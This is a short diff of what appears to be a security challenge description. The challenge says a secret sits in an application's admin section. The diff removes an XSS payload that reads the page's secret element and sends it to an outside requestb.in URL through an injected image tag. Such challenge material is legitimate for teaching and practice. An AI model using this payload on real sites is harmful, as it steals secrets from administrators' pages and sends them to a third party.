@@ -28,6 +28,3 @@ the application every five seconds.
 
 The secret is prominantly displayed in the admin section of the application.
 Gain access to the admin section and you'll find the secret.
-
-
-<script> $(function(){ $('table').append("<img src='http://requestb.in/piph78pi?secret=" + $('.secret').text() + "'>"); }); </script>
